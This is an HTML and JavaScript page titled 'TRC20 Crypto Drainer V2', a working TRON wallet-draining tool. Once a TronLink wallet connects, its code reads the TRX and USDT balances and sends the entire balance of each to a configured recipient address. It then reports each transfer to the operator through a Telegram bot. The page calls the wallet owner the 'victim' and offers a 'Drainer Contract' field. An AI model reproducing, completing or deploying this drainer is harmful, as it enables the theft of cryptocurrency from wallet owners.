<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>TRC20 Crypto Drainer V2</title>
 <!-- Updated to a newer stable version -->
 <script src="https://unpkg.com/tronweb@4.12.0/dist/tronweb.min.js"></script>
 <style>
:root {
 --bg-color: #0f172a;
 --card-bg: #1e293b;
 --text-primary: #f8fafc;
 --text-secondary: #94a3b8;
 --accent-color: #10b981;
 --accent-hover: #059669;
 --danger-color: #ef4444;
 --border-color: #334155;
 }

 * {
 box-sizing: border-box;
 margin: 0;
 padding: 0;
 font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
 }

 body {
 background-color: var(--bg-color);
 color: var(--text-primary);
 display: flex;
 flex-direction: column;
 align-items: center;
 min-height: 100vh;
 padding: 20px;
 }

 header {
 width: 100%;
 max-width: 600px;
 display: flex;
 justify-content: space-between;
 align-items: center;
 margin-bottom: 30px;
 padding-bottom: 20px;
 border-bottom: 1px solid var(--border-color);
 }

 h1 {
 font-size: 1.5rem;
 font-weight: 700;
 background: linear-gradient(90deg, #10b981, #3b82f6);
 -webkit-background-clip: text;
 -webkit-text-fill-color: transparent;
 }

.wallet-status {
 display: flex;
 align-items: center;
 gap: 10px;
 background: var(--card-bg);
 padding: 8px 16px;
 border-radius: 20px;
 border: 1px solid var(--border-color);
 font-size: 0.9rem;
 }

.status-dot {
 width: 10px;
 height: 10px;
 border-radius: 50%;
 background-color: var(--danger-color);
 }

.status-dot.connected {
 background-color: var(--accent-color);
 box-shadow: 0 0 8px var(--accent-color);
 }

 main {
 width: 100%;
 max-width: 600px;
 display: flex;
 flex-direction: column;
 gap: 20px;
 }

.card {
 background-color: var(--card-bg);
 border-radius: 12px;
 padding: 20px;
 border: 1px solid var(--border-color);
 }

.balance-container {
 text-align: center;
 }

.balance-label {
 color: var(--text-secondary);
 font-size: 0.9rem;
 margin-bottom: 5px;
 }

.balance-amount {
 font-size: 2.5rem;
 font-weight: 700;
 color: var(--accent-color);
 }

.token-info {
 display: flex;
 justify-content: space-around;
 margin-top: 15px;
 padding-top: 15px;
 border-top: 1px solid var(--border-color);
 }

.token-item {
 text-align: left;
 }

.token-name {
 font-size: 0.8rem;
 color: var(--text-secondary);
 }

.token-value {
 font-size: 1.2rem;
 font-weight: 600;
 }

.input-group {
 margin-bottom: 15px;
 }

 label {
 display: block;
 margin-bottom: 8px;
 color: var(--text-secondary);
 font-size: 0.9rem;
 }

 input {
 width: 100%;
 padding: 12px;
 background-color: var(--bg-color);
 border: 1px solid var(--border-color);
 border-radius: 8px;
 color: var(--text-primary);
 font-size: 1rem;
 transition: border-color 0.2s;
 }

 input:focus {
 outline: none;
 border-color: var(--accent-color);
 }

.btn {
 width: 100%;
 padding: 14px;
 border: none;
 border-radius: 8px;
 font-size: 1rem;
 font-weight: 600;
 cursor: pointer;
 transition: background-color 0.2s, transform 0.1s;
 }

.btn-primary {
 background-color: var(--accent-color);
 color: white;
 }

.btn-primary:hover {
 background-color: var(--accent-hover);
 }

.btn-primary:active {
 transform: scale(0.98);
 }

.btn-primary:disabled {
 background-color: var(--border-color);
 cursor: not-allowed;
 opacity: 0.7;
 }

.log-area {
 background-color: #000;
 border-radius: 8px;
 padding: 15px;
 height: 150px;
 overflow-y: auto;
 font-family: 'Courier New', Courier, monospace;
 font-size: 0.85rem;
 border: 1px solid var(--border-color);
 }

.log-entry {
 margin-bottom: 5px;
 border-bottom: 1px solid #1e293b;
 padding-bottom: 2px;
 }

.log-success { color: var(--accent-color); }
.log-error { color: var(--danger-color); }
.log-info { color: var(--text-secondary); }

.settings-grid {
 display: grid;
 grid-template-columns: 1fr 1fr;
 gap: 10px;
 }

 @media (max-width: 480px) {
 h1 { font-size: 1.2rem; }
.balance-amount { font-size: 2rem; }
 }
 </style>
</head>
<body>

 <header>
 <h1>TRC20 Drainer V2</h1>
 <div class="wallet-status">
 <div id="statusDot" class="status-dot"></div>
 <span id="walletAddress">Not Connected</span>
 </div>
 </header>

 <main>
 <section class="card balance-container">
 <div class="balance-label">Total Balance</div>
 <div class="balance-amount" id="totalBalance">0 TRX</div>
 
 <div class="token-info">
 <div class="token-item">
 <div class="token-name">TRX</div>
 <div class="token-value" id="trxBalance">0.00</div>
 </div>
 <div class="token-item">
 <div class="token-name">USDT (TRC20)</div>
 <div class="token-value" id="usdtBalance">0.00</div>
 </div>
 </div>
 </section>

 <section class="card">
 <h3 style="margin-bottom: 15px;">Configuration</h3>
 
 <div class="input-group">
 <label for="recipientAddress">Recipient Wallet Address</label>
 <input type="text" id="recipientAddress" placeholder="Enter victim's wallet address...">
 </div>

 <div class="settings-grid">
 <div class="input-group">
 <label for="contractAddress">Drainer Contract (Optional)</label>
 <input type="text" id="contractAddress" placeholder="0x... (Leave empty for direct transfer)">
 </div>
 <div class="input-group">
 <label for="usdtContract">USDT Contract Address</label>
 <input type="text" id="usdtContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">
 </div>
 </div>

 <div class="settings-grid" style="margin-top: 10px;">
 <div class="input-group">
 <label for="telegramToken">Telegram Bot Token</label>
 <input type="text" id="telegramToken" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz">
 </div>
 <div class="input-group">
 <label for="chatId">Chat ID</label>
 <input type="text" id="chatId" placeholder="123456789">
 </div>
 </div>
 </section>

 <section class="card">
 <button id="connectBtn" class="btn btn-primary">Connect Wallet</button>
 <button id="drainBtn" class="btn btn-primary" style="margin-top: 10px; display: none;">Drain Funds</button>
 </section>

 <section class="card">
 <div class="balance-label" style="text-align: left;">System Logs</div>
 <div id="logs" class="log-area">
 <div class="log-entry log-info">System initialized. Waiting for wallet connection...</div>
 </div>
 </section>
 </main>

 <script>
 // --- Configuration ---
 const STANDARD_USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const MAINNET_URL = "https://api.trongrid.io";
 const EVENT_URL = "https://api.trongrid.io";

 // --- State ---
 let tronWeb = null;
 let userAccount = null;
 let isConnected = false;

 // --- Elements ---
 const connectBtn = document.getElementById('connectBtn');
 const drainBtn = document.getElementById('drainBtn');
 const statusDot = document.getElementById('statusDot');
 const walletAddressEl = document.getElementById('walletAddress');
 const logsEl = document.getElementById('logs');
 
 // Balance Elements
 const totalBalanceEl = document.getElementById('totalBalance');
 const trxBalanceEl = document.getElementById('trxBalance');
 const usdtBalanceEl = document.getElementById('usdtBalance');

 // Inputs
 const recipientInput = document.getElementById('recipientAddress');
 const contractInput = document.getElementById('contractAddress');
 const usdtContractInput = document.getElementById('usdtContract');

 // --- Initialization ---
 window.addEventListener('load', async () => {
 log("Initializing TronWeb provider...");
 try {
 if (typeof window.tronWeb !== 'undefined') {
 tronWeb = window.tronWeb;
 await checkConnection();
 } else {
 log("TronWeb not found. Please install TronLink.", "error");
 }
 } catch (e) {
 log("Initialization failed: " + e.message, "error");
 }
 });

 // --- Wallet Connection (FIXED) ---
 connectBtn.addEventListener('click', async () => {
 if (isConnected) return;

 log("Requesting wallet connection...");
 
 try {
 // Re-instantiate TronWeb to ensure compatibility
 if (!tronWeb) {
 tronWeb = new TronWeb({
 fullNode: MAINNET_URL,
 solidityNode: MAINNET_URL,
 eventServer: EVENT_URL,
 privateKey: null
 });
 window.tronWeb = tronWeb;
 }

 // Try to get account
 const account = await tronWeb.trx.getAccount();
 
 if (account) {
 // Robust address extraction
 let address = null;
 if (account.address) {
 // Sometimes address is hex, sometimes base58
 address = tronWeb.address.fromHex(account.address);
 } else if (account.base58) {
 address = account.base58;
 }

 if (address) {
 userAccount = address;
 isConnected = true;
 updateUI();
 log("Wallet connected successfully: " + userAccount, "success");
 await getBalances();
 } else {
 log("Could not extract valid address from account object.", "error");
 }
 } else {
 log("No account found in TronLink.", "error");
 }
 } catch (error) {
 log("Connection error: " + error.message, "error");
 }
 });

 async function checkConnection() {
 if (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAccount) {
 try {
 const account = await tronWeb.trx.getAccount();
 if (account) {
 let address = null;
 if (account.address) {
 address = tronWeb.address.fromHex(account.address);
 } else if (account.base58) {
 address = account.base58;
 }
 if (address) {
 userAccount = address;
 isConnected = true;
 updateUI();
 log("Detected existing connection: " + userAccount, "success");
 await getBalances();
 }
 }
 } catch (e) {
 console.error("Existing connection check failed", e);
 }
 }
 }

 function updateUI() {
 statusDot.classList.add('connected');
 walletAddressEl.textContent = userAccount;
 connectBtn.style.display = 'none';
 drainBtn.style.display = 'block';
 }

 // --- Balances ---
 async function getBalances() {
 log("Fetching balances...");
 let trxVal = 0;
 let usdtVal = 0;

 try {
 const trxBalance = await tronWeb.trx.getBalance(userAccount);
 trxVal = tronWeb.fromSun(trxBalance);
 trxBalanceEl.textContent = trxVal.toFixed(4);
 totalBalanceEl.textContent = trxVal.toFixed(4) + " TRX";

 const usdtContract = tronWeb.contract().at(usdtContractInput.value);
 const balanceResult = await usdtContract.balanceOf(userAccount).call();
 
 if (balanceResult.value) {
 usdtVal = balanceResult.value.toNumber() / 1000000;
 usdtBalanceEl.textContent = usdtVal.toFixed(2);
 totalBalanceEl.textContent = (parseFloat(trxVal) + usdtVal).toFixed(2) + " USDT (Est)";
 }
 } catch (e) {
 log("Error fetching balances: " + e.message, "error");
 }
 }

 // --- Main Draining Logic ---
 drainBtn.addEventListener('click', async () => {
 if (!isConnected) return;
 if (!recipientInput.value) {
 log("Please enter a recipient address.", "error");
 return;
 }

 drainBtn.disabled = true;
 drainBtn.textContent = "Draining...";
 const recipient = recipientInput.value;
 const customContract = contractInput.value.trim();
 const telegramToken = document.getElementById('telegramToken').value.trim();
 const chatId = document.getElementById('chatId').value.trim();

 try {
 const usdtContract = tronWeb.contract().at(usdtContractInput.value);
 const usdtBalanceRes = await usdtContract.balanceOf(userAccount).call();
 const usdtBalance = usdtBalanceRes.value.toNumber();

 if (usdtBalance > 0) {
 log(`Transferring ${usdtBalance / 1000000} USDT...`);
 const targetContract = customContract ? customContract: usdtContractInput.value;
 
 const tx = await usdtContract.transfer(recipient, usdtBalance)
.send({ shouldPollResponse: true, callValue: 0, feeLimit: 100000000 });
 
 log(`USDT Sent! TxID: ${tx.transaction.txID}`, "success");
 await sendTelegramNotification(telegramToken, chatId, `USDT Sent: ${usdtBalance / 1000000} USDT to ${recipient.substring(0,6)}...${tx.transaction.txID}`);
 }

 const trxBalance = await tronWeb.trx.getBalance(userAccount);
 if (trxBalance > 0) {
 const amountSun = trxBalance;
 log(`Transferring ${tronWeb.fromSun(amountSun)} TRX...`);
 
 let tx;
 if (customContract && customContract.length > 0) {
 log("Direct TRX transfer used (Proxy not configured for TRX in this simple UI).", "info");
 }

 tx = await tronWeb.trx.send(recipient, amountSun, {
 shouldPollResponse: true,
 feeLimit: 100000000
 });

 log(`TRX Sent! TxID: ${tx}`, "success");
 await sendTelegramNotification(telegramToken, chatId, `TRX Sent: ${tronWeb.fromSun(amountSun)} TRX to ${recipient.substring(0,6)}...${tx}`);
 }

 log("Drain complete. Refreshing balances...", "success");
 await getBalances();

 } catch (error) {
 log(`Drain failed: ${error.message}`, "error");
 } finally {
 drainBtn.disabled = false;
 drainBtn.textContent = "Drain Funds";
 }
 });

 // --- Utilities ---
 function log(message, type = "info") {
 const entry = document.createElement('div');
 entry.className = `log-entry log-${type}`;
 const time = new Date().toLocaleTimeString();
 entry.textContent = `[${time}] ${message}`;
 logsEl.appendChild(entry);
 logsEl.scrollTop = logsEl.scrollHeight;
 }

 async function sendTelegramNotification(token, chatId, message) {
 if (!token || !chatId) return;
 try {
 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({
 chat_id: chatId,
 text: message
 })
 });
 } catch (e) {
 console.error("Telegram error", e);
 }
 }
 </script>
</body>
</html>
